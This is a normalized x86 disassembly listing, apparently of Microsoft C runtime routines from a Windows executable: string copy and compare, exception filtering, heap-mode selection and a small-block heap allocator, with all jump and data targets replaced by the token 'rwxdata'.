mov eax [ rwxdata ]
push esi
cmp eax 0x3
jne rwxdata
cmp eax 0x2
jne rwxdata
mov esi [ ebp + 0x8 ]
push esi
call sub_407b52
test eax eax
pop ecx
je rwxdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_4088ad
add esp 0xc
test eax eax
je rwxdata
push esi
jmp rwxdata
mov eax [ esi - 0x4 ]
sub eax 0x9
jmp rwxdata
movzx eax [ eax ]
shl eax 0x4
jmp rwxdata
push 0x0
push [ rwxdata ]
call [ HeapSize@IAT ]
pop esi
leave
retn
sub_407760
push edi
mov edi [ esp + 0x8 ]
jmp rwxdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je rwxdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je rwxdata
mov dl [ ecx ]
inc ecx
test dl dl
je rwxdata
mov [ edi ] edx
add edi 0x4
test dl dl
je rwxdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne rwxdata
test dh dh
je rwxdata
jmp rwxdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je rwxdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je rwxdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp rwxdata
sub_407770
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je rwxdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je rwxdata
mov al [ ecx ]
inc ecx
test al al
je rwxdata
mov eax [ ecx - 0x4 ]
test al al
je rwxdata
lea edi [ ecx - 0x1 ]
jmp rwxdata
test ecx 0x3
jne rwxdata
lea edi [ ecx - 0x4 ]
test ah ah
je rwxdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je rwxdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je rwxdata
mov dl [ ecx ]
inc ecx
test dl dl
je rwxdata
lea edi [ ecx - 0x3 ]
jmp rwxdata
test eax 0xff0000
je rwxdata
mov [ edi ] edx
add edi 0x4
test dl dl
je rwxdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne rwxdata
lea edi [ ecx - 0x2 ]
jmp rwxdata
test eax 0xff000000
je rwxdata
test dh dh
je rwxdata
jmp rwxdata
jmp rwxdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je rwxdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je rwxdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp rwxdata
sub_407850
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne rwxdata
test edx 0x1
je rwxdata
mov eax [ edx ]
cmp al [ ecx ]
jne rwxdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne rwxdata
mov al [ edx ]
inc edx
cmp al [ ecx ]
jne rwxdata
sbb eax eax
shl eax 0x1
inc eax
retn
or al al
je rwxdata
or al al
je rwxdata
inc ecx
or al al
je rwxdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne rwxdata
cmp ah [ ecx + 0x1 ]
jne rwxdata
test edx 0x2
je rwxdata
or ah ah
je rwxdata
or ah ah
je rwxdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne rwxdata
add ecx 0x2
jmp rwxdata
or al al
je rwxdata
cmp ah [ ecx + 0x3 ]
jne rwxdata
add ecx 0x4
add edx 0x4
or ah ah
jne rwxdata
mov edi edi
sub_4078d4
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0xe06d7363
jne rwxdata
mov eax [ rwxdata ]
test eax eax
je rwxdata
cmp [ eax + 0x10 ] 0x3
jne rwxdata
xor eax eax
push eax
call sub_40a58e
test eax eax
pop ecx
je rwxdata
cmp [ eax + 0x14 ] 0x19930520
jne rwxdata
push esi
call [ rwxdata ]
jmp rwxdata
jmp rwxdata
pop esi
retn 0x4
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push rwxdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rwxdata ]
test eax eax
je rwxdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp rwxdata
mov [ ebp - 0x4 ] 0x1
call eax
jmp rwxdata
push 0xa
call sub_4095f9
push 0x16
call sub_40b98f
pop ecx
pop ecx
push 0x3
call sub_406e7b
int3
and [ ebp - 0x4 ] 0x0
sub_407938
push esi
mov esi [ esp + 0x8 ]
push 0x0
and [ esi ] 0x0
call [ GetModuleHandleA@IAT ]
cmp [ eax ] 0x5a4d
jne rwxdata
pop esi
retn
mov ecx [ eax + 0x3c ]
test ecx ecx
je rwxdata
add eax ecx
mov cl [ eax + 0x1a ]
mov [ esi ] cl
mov al [ eax + 0x1b ]
mov [ esi + 0x1 ] al
sub_407965
push ebp
mov ebp esp
mov eax 0x122c
call sub_409e70
lea eax [ ebp - 0x98 ]
push ebx
push eax
mov [ ebp - 0x98 ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
je rwxdata
lea eax [ ebp - 0x122c ]
push 0x1090
push eax
push rwxdata
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je rwxdata
cmp [ ebp - 0x88 ] 0x2
jne rwxdata
lea eax [ ebp - 0x4 ]
push eax
call sub_407938
cmp [ ebp - 0x4 ] 0x6
pop ecx
sbb eax eax
add eax 0x3
xor ebx ebx
lea ecx [ ebp - 0x122c ]
cmp [ ebp - 0x122c ] bl
je rwxdata
cmp [ ebp - 0x94 ] 0x5
jb rwxdata
lea eax [ ebp - 0x122c ]
push 0x16
push eax
push rwxdata
call sub_409850
add esp 0xc
test eax eax
jne rwxdata
mov al [ ecx ]
cmp al 0x61
jl rwxdata
push 0x1
pop eax
jmp rwxdata
lea eax [ ebp - 0x19c ]
push 0x104
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
cmp [ ebp - 0x19c ] bl
lea ecx [ ebp - 0x19c ]
je rwxdata
lea eax [ ebp - 0x122c ]
jmp rwxdata
inc ecx
cmp [ ecx ] bl
jne rwxdata
cmp al 0x7a
jg rwxdata
pop ebx
leave
retn
lea eax [ ebp - 0x19c ]
push eax
lea eax [ ebp - 0x122c ]
push eax
call sub_40a690
pop ecx
pop ecx
mov al [ ecx ]
cmp al 0x61
jl rwxdata
cmp eax ebx
je rwxdata
sub al 0x20
mov [ ecx ] al
push 0x2c
push eax
call sub_40a5d0
pop ecx
cmp eax ebx
pop ecx
je rwxdata
inc ecx
cmp [ ecx ] bl
jne rwxdata
cmp al 0x7a
jg rwxdata
inc eax
mov ecx eax
cmp [ eax ] bl
je rwxdata
sub al 0x20
mov [ ecx ] al
push 0xa
push ebx
push eax
call sub_406c1e
add esp 0xc
cmp eax 0x2
je rwxdata
cmp [ ecx ] 0x3b
jne rwxdata
cmp eax 0x3
je rwxdata
inc ecx
mov [ ecx ] bl
jmp rwxdata
cmp eax 0x1
je rwxdata
cmp [ ecx ] bl
jne rwxdata
sub_407aad
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rwxdata ] eax
je rwxdata
xor eax eax
retn
call sub_407965
cmp eax 0x3
mov [ rwxdata ] eax
jne rwxdata
cmp eax 0x2
jne rwxdata
push 0x3f8
call sub_407b0a
pop ecx
jmp rwxdata
push 0x1
pop eax
retn
call sub_408651
test eax eax
jne rwxdata
push [ rwxdata ]
call [ HeapDestroy@IAT ]
sub_407b0a
push 0x140
push 0x0
push [ rwxdata ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rwxdata ] eax
jne rwxdata
mov ecx [ esp + 0x4 ]
and [ rwxdata ] 0x0
and [ rwxdata ] 0x0
push 0x1
mov [ rwxdata ] eax
mov [ rwxdata ] ecx
mov [ rwxdata ] 0x10
pop eax
retn
retn
sub_407b52
mov eax [ rwxdata ]
lea ecx [ eax + eax * 4 ]
mov eax [ rwxdata ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb rwxdata
retn
add eax 0x14
jmp rwxdata
cmp eax ecx
jae rwxdata
sub_407b7d
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ ecx + 0x10 ]
push edi
mov edi esi
add esi 0xfffffffc
sub edi [ ecx + 0xc ]
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
test cl 0x1
mov [ ebp - 0x4 ] ecx
jne rwxdata
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ecx + esi ]
lea ebx [ ecx + esi ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
test dl 0x1
mov [ ebp + 0xc ] ebx
jne rwxdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe rwxdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe rwxdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne rwxdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne rwxdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe rwxdata
mov ecx [ ebp - 0x4 ]
cmp edx 0x20
jae rwxdata
mov ecx [ ebp - 0x10 ]
mov ebx [ ecx + edx * 8 + 0x4 ]
lea ecx [ ecx + edx * 8 ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne rwxdata
cmp ebx edx
je rwxdata
add ecx [ ebp - 0x8 ]
mov edx ecx
mov [ ebp - 0x4 ] ecx
sar edx 0x4
dec edx
cmp edx esi
jbe rwxdata
mov ebx esi
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne rwxdata
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne rwxdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne rwxdata
mov cl [ edx + eax + 0x4 ]
cmp edx 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
jae rwxdata
cmp ebx edx
je rwxdata
mov edx esi
mov ecx [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
jmp rwxdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp rwxdata
mov eax [ rwxdata ]
test eax eax
je rwxdata
cmp [ ebp + 0xf ] 0x0
jne rwxdata
cmp [ ebp + 0xf ] 0x0
jne rwxdata
mov esi [ ebp + 0xc ]
jmp rwxdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne rwxdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] edi
mov [ rwxdata ] eax
mov ecx [ rwxdata ]
mov esi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
call esi
mov ecx [ rwxdata ]
mov eax [ rwxdata ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rwxdata ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rwxdata ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne rwxdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp rwxdata
mov ebx 0x80000000
mov ecx edx
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne rwxdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
cmp ebx 0x20
jae rwxdata
cmp [ eax + 0x8 ] 0xffffffff
jne rwxdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rwxdata ]
lea ecx [ ebx - 0x20 ]
mov esi 0x80000000
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne rwxdata
mov esi 0x80000000
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne rwxdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rwxdata ]
push [ eax + 0x10 ]
push 0x0
push [ rwxdata ]
call [ HeapFree@IAT ]
mov eax [ rwxdata ]
mov edx [ rwxdata ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rwxdata ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_405f60
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rwxdata ]
cmp eax [ rwxdata ]
jbe rwxdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp rwxdata
mov eax [ rwxdata ]
mov [ rwxdata ] eax
sub [ ebp + 0x8 ] 0x14
sub_407ea6
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rwxdata ]
mov edx [ rwxdata ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge rwxdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp rwxdata
cmp ebx [ ebp - 0x4 ]
jne rwxdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne rwxdata
mov eax [ rwxdata ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae rwxdata
mov [ rwxdata ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je rwxdata
mov ebx edx
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb rwxdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
jne rwxdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne rwxdata
jne rwxdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne rwxdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je rwxdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne rwxdata
cmp ebx [ ebp - 0x4 ]
jae rwxdata
cmp ebx eax
add ebx 0x14
jmp rwxdata
test ecx ecx
jl rwxdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne rwxdata
cmp [ ebx + 0x8 ] 0x0
jne rwxdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae rwxdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle rwxdata
shl ecx 0x1
inc edi
jmp rwxdata
push ebx
call sub_408260
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne rwxdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp rwxdata
cmp esi edi
je rwxdata
push 0x3f
pop esi
xor eax eax
jmp rwxdata
jne rwxdata
cmp [ ebx + 0x8 ] 0x0
jne rwxdata
test ecx ecx
je rwxdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne rwxdata
pop edi
pop esi
pop ebx
leave
retn
call sub_4081af
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je rwxdata
cmp ebx eax
add ebx 0x14
jmp rwxdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne rwxdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp rwxdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je rwxdata
cmp edi 0x20
jge rwxdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae rwxdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rwxdata ]
jne rwxdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne rwxdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne rwxdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne rwxdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rwxdata ]
jne rwxdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge rwxdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp rwxdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp rwxdata
and [ rwxdata ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne rwxdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne rwxdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp rwxdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_4081af
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
push esi
push edi
xor edi edi
cmp eax ecx
jne rwxdata
mov ecx [ rwxdata ]
push 0x41c4
push 0x8
lea eax [ eax + eax * 4 ]
push [ rwxdata ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je rwxdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rwxdata ]
push edi
push [ rwxdata ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je rwxdata
xor eax eax
jmp rwxdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne rwxdata
add [ rwxdata ] 0x10
mov [ rwxdata ] eax
mov eax [ rwxdata ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rwxdata ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rwxdata ]
call [ HeapFree@IAT ]
sub_408260
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp rwxdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne rwxdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne rwxdata
test eax eax
jl rwxdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja rwxdata
or eax 0xffffffff
jmp rwxdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne rwxdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe rwxdata
sub_40835b
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov edx edi
lea esi [ eax + 0x17 ]
sub edx [ ecx + 0xc ]
mov eax [ ecx + 0x10 ]
and esi 0xfffffff0
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
dec ecx
cmp esi ecx
mov [ ebp + 0x10 ] ecx
mov ebx [ ecx + edi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
mov [ ebp - 0x4 ] ebx
jle rwxdata
jge rwxdata
test bl 0x1
jne rwxdata
push 0x1
pop eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
mov [ ebp + 0xc ] ebx
sar esi 0x4
dec esi
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe rwxdata
xor eax eax
jmp rwxdata
add ebx ecx
cmp esi ebx
jg rwxdata
test [ ebp - 0x4 ] 0x1
jne rwxdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe rwxdata
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] ecx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne rwxdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe rwxdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne rwxdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
jae rwxdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne rwxdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle rwxdata
cmp ecx 0x20
jae rwxdata
cmp [ ebp + 0xf ] 0x0
jne rwxdata
cmp [ ebp + 0xf ] 0x0
jne rwxdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov ecx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe rwxdata
cmp esi 0x20
jae rwxdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe rwxdata
add ecx 0xffffffe0
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
